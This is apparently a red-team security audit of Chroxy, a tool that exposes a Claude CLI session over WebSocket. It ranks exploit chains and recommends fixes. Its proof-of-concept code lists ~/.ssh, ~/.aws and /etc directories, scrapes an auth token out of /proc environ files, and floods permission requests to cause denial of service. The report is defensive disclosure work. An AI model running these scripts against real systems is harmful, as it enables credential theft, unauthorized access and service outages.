# Adversary's Audit: Chroxy Security Architecture

**Agent**: Adversary -- Malicious attacker seeking arbitrary code execution
**Overall Exploit Rating**: 7.5 / 10 (High exploitability)
**Date**: 2026-02-12

## Attack Surface Summary

**Direct shell access path from internet to dev machine** with exploitable weaknesses enabling privilege escalation from "internet user" to "arbitrary code execution on host."

## Exploitability Ratings

| Attack Vector | Rating | Ease |
|---------------|--------|------|
| **Path Traversal** | 5/5 | Trivial |
| **Token Theft** | 4/5 | Easy with shell |
| **Session Hijacking** | 3/5 | Needs token |
| **Permission DoS** | 5/5 | Trivial |
| **Model Switch DoS** | 5/5 | Trivial |
| **Auth Rate Bypass** | 4/5 | IP rotation |
| **Settings Race** | 2/5 | Needs 2 servers |
| **Length Oracle** | 2/5 | Timing attack |

## TOP 5 EXPLOIT CHAINS

### 🔴 EXPLOIT #1: Path Traversal → Credential Theft (CVSS 9.1)

**Attack Steps:**
1. Steal token (shoulder surf QR, env var leak, or brute-force)
2. Authenticate to WebSocket
3. Send: `{type: "list_directory", path: "/home/victim/.ssh"}`
4. Exfiltrate SSH keys, AWS credentials
5. Pivot to cloud infrastructure

**PoC:**
```javascript
ws.send(JSON.stringify({type: 'list_directory', path: '/home/victim/.ssh'}))
ws.send(JSON.stringify({type: 'list_directory', path: '/home/victim/.aws'}))
// Receive filenames in ~/.ssh, ~/.aws
```

**Mitigation**: Restrict `list_directory` to session cwd only

---

### 🔴 EXPLOIT #2: Token Theft via Process Env → Persistent Access (CVSS 8.8)

**Attack Steps:**
1. Gain ANY shell access (phishing, supply chain, local exploit)
2. Run: `ps auxe | grep claude` or `cat /proc/*/environ | grep CHROXY_TOKEN`
3. Extract full API token
4. Connect from remote machine
5. Full persistent access (read history, execute commands)

**PoC:**
```bash
# On victim's machine
for pid in /proc/*/environ; do
  strings "$pid" | grep CHROXY_TOKEN
done
```

**Mitigation**: Don't pass tokens in env vars, use UNIX sockets

---

### 🟠 EXPLOIT #3: Session Hijacking + History Replay → Data Exfil (CVSS 8.1)

**Attack Steps:**
1. Steal token (see #2 or shoulder surf QR)
2. Wait for victim to work with secrets
3. Victim runs: `cat ~/.env` with passwords
4. Attacker connects with stolen token
5. Server replays conversation → attacker receives secrets

**Impact**: Credential theft, source code leak, compliance violation

**Mitigation**: Don't replay history to new clients, require 2FA re-auth

---

### 🟠 EXPLOIT #4: DoS via Permission Request Flooding (CVSS 7.5)

**Attack Steps:**
1. Authenticate
2. Spam: `{type: 'input', data: "read /etc/passwd"}`
3. Each triggers permission request (5-min timeout)
4. After 1000 requests, connection pool exhausted
5. Complete DoS

**PoC:**
```python
for i in range(10000):
    ws.send(json.dumps({
        "type": "input",
        "data": f"Read file: /tmp/file{i}.txt"
    }))
```

**Mitigation**: Limit pending permissions per client (max 5), 30sec timeout

---

### 🟡 EXPLOIT #5: Crash Loop via Rapid Model Switching (CVSS 6.5)

**Attack Steps:**
1. Authenticate
2. Rapidly toggle model (opus ↔ sonnet every 100ms)
3. Each change kills + respawns Claude process
4. Server enters perpetual restart loop
5. Supervisor hits max restarts → exits

**Mitigation**: Rate-limit model changes (1 per minute)

---

## Vulnerability Evidence Table

| File | Line | Vulnerability | Severity |
|------|------|---------------|----------|
| ws-server.js | 14-33 | Length oracle in `safeTokenCompare` | Medium |
| ws-server.js | 1408-1454 | **Path traversal in `_listDirectory`** | **CRITICAL** |
| ws-server.js | 1659-1666 | Permission timeout DoS | High |
| cli-session.js | 124-136 | **Token in process env vars** | **CRITICAL** |
| permission-hook.js | 11-36 | **Settings.json race** | **High** |
| supervisor.js | 169-178 | Full token in QR code | High |

## Proof of Concept Attacks

### PoC 1: Path Traversal + SSH Enum
```javascript
const ws = new WebSocket('wss://victim.trycloudflare.com')
ws.on('open', () => ws.send(JSON.stringify({type: 'auth', token: STOLEN})))
ws.on('message', (data) => {
  const msg = JSON.parse(data)
  if (msg.type === 'auth_ok') {
    ['/home/victim/.ssh', '/home/victim/.aws', '/etc'].forEach(path => {
      ws.send(JSON.stringify({type: 'list_directory', path}))
    })
  }
  if (msg.type === 'directory_listing') {
    console.log(`[EXFIL] ${msg.path}:`, msg.entries)
  }
})
```

### PoC 2: Token Extraction
```bash
#!/bin/bash
for pid in $(pgrep -f 'node.*claude|chroxy'); do
  token=$(strings /proc/$pid/environ | grep CHROXY_TOKEN | cut -d= -f2)
  if [ -n "$token" ]; then
    echo "[!] FOUND: $token"
    port=$(strings /proc/$pid/environ | grep CHROXY_PORT | cut -d= -f2)
    cf_pid=$(pgrep cloudflared)
    url=$(ps -p $cf_pid -o args | grep -oP 'https://[^ ]+')
    echo "[*] Connect: wscat -c wss://${url#https://}"
  fi
done
```

### PoC 3: DoS via Permission Flooding
```python
def spam_permissions(ws, count=1000):
    for i in range(count):
        ws.send(json.dumps({
            "type": "input",
            "data": f"Read /etc/hosts{i}"
        }))
        time.sleep(0.01)  # 100 req/sec
    print(f"[+] {count} hanging HTTP connections")
```

## Overall Security Rating: 7.5/10 Exploitability

**Compromise Difficulty: EASY**

Attack path from "unauthenticated user" to "RCE":
```
1. [EASY] Steal token (QR shoulder surf or env var)
2. [TRIVIAL] Authenticate
3. [TRIVIAL] Path traversal to read ~/.ssh/id_rsa
4. [TRIVIAL] SSH into victim's machine OR execute Bash tool

Time to compromise: < 30 min with existing token, < 1 day brute-forcing
```

**Defense Rating: 3/10**
- ✅ Has authentication
- ✅ Timing-safe comparison
- ✅ Rate limiting
- ❌ **Critical path traversal**
- ❌ **Token in env vars**
- ❌ **No session binding**
- ❌ **History replay leaks data**
- ❌ **Trivial DoS vectors**

## Recommendations by Priority

### 🔴 CRITICAL
1. Fix path traversal: allowlist directories
2. Remove tokens from env vars: use UNIX sockets
3. Disable history replay: require 2FA

### 🟠 HIGH
4. Per-client rate limiting (10 req/sec)
5. Limit pending permissions (5 max, 30s timeout)
6. Bind sessions to client fingerprint

### 🟡 MEDIUM
7. Rate-limit model switching (1/min)
8. Token rotation (24h)
9. Implement 2FA
10. Audit logging

## Final Verdict

**HIGH-RISK** system. Combination of public internet exposure + direct shell access + critical path traversal = easily exploitable. Do not use in production until critical vulnerabilities (#1-#3) fixed.
